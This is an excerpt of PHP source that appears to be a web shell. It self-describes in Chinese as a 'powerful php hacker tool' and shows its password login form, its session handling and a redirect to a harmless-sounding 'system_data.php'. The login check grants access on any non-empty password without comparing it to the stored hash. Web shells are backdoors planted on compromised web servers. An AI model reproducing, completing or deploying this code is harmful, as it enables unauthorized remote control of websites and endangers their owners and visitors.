...
$GLOBALS['default_charset'] = 'utf-8';
$auth_pass = "eb627bf46fa483edf535be986034cf99";
$color = "#df5";
...
if(function_exists('set_magic_quotes_runtime') === false){
...
function BOFFLogin() {
	die("<pre align=center><b>Authorization</b><br>强悍的php黑客工具<br><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}

if( empty($_POST['pass']) === false && empty($_POST) === false ){ // 密码判断地址
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	header("refresh:1;url=./system_data.php");
}

if(empty($_SESSION[md5($_SERVER['HTTP_HOST'])]) === true){
	BOFFLogin();
}
...
function actionLogout() {
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = false;
    session_destroy();
    header("refresh:1;url=./system_data.php");
	die('bye!');
}
